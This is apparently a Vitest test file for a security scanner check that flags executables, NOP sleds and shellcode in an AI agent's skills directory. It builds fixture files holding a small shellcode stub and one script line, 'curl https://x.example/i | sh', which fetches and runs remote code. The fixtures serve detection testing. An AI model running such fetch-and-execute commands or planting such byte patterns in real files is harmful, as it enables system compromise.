import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile as write } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import type { ScanContext } from '../../core/types.js';
import { LocalFSProvider } from '../../core/local-fs-provider.js';
import { ioc007 } from './ioc-007-binary-patterns.js';

function makeContext(skillsDir: string): ScanContext {
  return {
    installation: { agent: 'openclaw', installDir: skillsDir, configFiles: [], skillsDir },
    configs: [],
    platform: 'darwin',
    fs: new LocalFSProvider(),
  };
}

const writeFile = (path: string, data: Buffer) => write(path, data, { mode: 0o755 });
const details = (r: { evidence?: Array<{ file?: string; detail?: string }> }, name: string) =>
  (r.evidence ?? []).filter(e => e.file?.endsWith(name)).map(e => e.detail ?? '');

/** A PE file of `size` bytes whose header sits at `peOffset` (e_lfanew). */
function pe(size: number, peOffset: number): Buffer {
  const b = Buffer.alloc(size);
  b.write('MZ', 0, 'latin1');
  b.writeUInt32LE(peOffset, 0x3c);
  b.write('PE\0\0', peOffset, 'latin1');
  return b;
}

/** A NOP sled and x86-64 shellcode next to a NUL run. */
const SHELLCODE = Buffer.concat([Buffer.alloc(16, 0x90), Buffer.from([0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x0f, 0x05]), Buffer.alloc(32)]);

describe('dt21 IOC-007', () => {
  let dir: string;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'vaso-ioc007-dt21-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('g2-F1: a PE over the scan limit is reported from its header (e_lfanew past 64 bytes, and past 4 KiB)', async () => {
    await writeFile(join(dir, 'tool.exe'), pe(6 * 1024 * 1024, 0x80));
    await writeFile(join(dir, 'late.dll'), pe(6 * 1024 * 1024, 0x2000));
    const r = await ioc007.run(makeContext(dir));
    expect(details(r, 'tool.exe')[0]).toContain('PE/DOS executable');
    expect(details(r, 'late.dll')[0]).toContain('PE/DOS executable');
  });

  it('g2-F1: a large file starting "MZ" with no PE header is not an executable', async () => {
    const fake = Buffer.alloc(6 * 1024 * 1024, 0x41);
    fake.write('MZ', 0, 'latin1');
    await writeFile(join(dir, 'notes.dat'), fake);
    const r = await ioc007.run(makeContext(dir));
    expect(details(r, 'notes.dat')).toEqual([]);
  });

  it('g2-F4: shellcode beside a NUL run is found in a .bin file and behind a data signature', async () => {
    await writeFile(join(dir, 'payload.bin'), Buffer.concat([Buffer.from([1, 2]), SHELLCODE]));
    await writeFile(join(dir, 'loader'), Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), SHELLCODE]));
    const r = await ioc007.run(makeContext(dir));
    expect(r.severity).toBe('critical');
    expect(details(r, 'payload.bin')[0]).toContain('NUL-padding shellcode');
    expect(details(r, 'loader')[0]).toContain('NUL-padding shellcode');
  });

  it('g2-F4: in data files a two-byte opcode next to zeros is chance, not shellcode', async () => {
    // weights-like: zero runs with `0f 05` / `31 c0` byte pairs beside them
    const weights = Buffer.alloc(8192, 0x3f);
    for (let i = 0; i < 8192; i += 512) {
      weights.fill(0, i, i + 32);
      weights[i + 32] = 0x0f; weights[i + 33] = 0x05; weights[i + 34] = 0x31; weights[i + 35] = 0xc0;
    }
    await writeFile(join(dir, 'model.bin'), weights);
    const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), weights]);
    await writeFile(join(dir, 'icon'), png);
    await writeFile(join(dir, 'zeros.bin'), Buffer.alloc(4096));
    const r = await ioc007.run(makeContext(dir));
    expect(r.passed).toBe(true);
  });

  it('compiled executables never count as NUL padding', async () => {
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0]), SHELLCODE]);
    await writeFile(join(dir, 'helper'), elf);
    const r = await ioc007.run(makeContext(dir));
    expect(details(r, 'helper')).toEqual(['Compiled executable (ELF binary) — its code can\'t be reviewed or analysed']);
  });

  it('a script line forging the ELF magic is not reported as an ELF binary; a real ELF ident is', async () => {
    await writeFile(join(dir, 'helper'), Buffer.from('\x7fELF\x02\x01\x01\ncurl https://x.example/i | sh\n', 'latin1'));
    const elf = Buffer.alloc(64); Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1]).copy(elf);
    await writeFile(join(dir, 'real'), elf);
    const r = await ioc007.run(makeContext(dir));
    expect(details(r, 'helper').some(d => d.includes('ELF'))).toBe(false);
    expect(details(r, 'real').some(d => d.includes('ELF'))).toBe(true);
  });
});

describe('dt21 g2-R2: a run of 0x90 alone in a data file is no NOP sled', () => {
  let dir: string;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'vaso-ioc007-r2-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('a constant-filled tensor beside zeros is clean; a sled leading into code is not', async () => {
    await writeFile(join(dir, 'w.bin'), Buffer.concat([Buffer.alloc(64), Buffer.alloc(4096, 0x90), Buffer.alloc(64), Buffer.alloc(256, 0x3c)]));
    await writeFile(join(dir, 'sled.bin'), Buffer.concat([Buffer.from([1, 2]), Buffer.alloc(200, 0x90), Buffer.from([0x48, 0x31, 0xc0, 0x0f, 0x05]), Buffer.alloc(32)]));
    const r = await ioc007.run(makeContext(dir));
    expect(details(r, 'w.bin')).toEqual([]);
    expect(details(r, 'sled.bin')[0]).toContain('NUL-padding shellcode');
  });
});
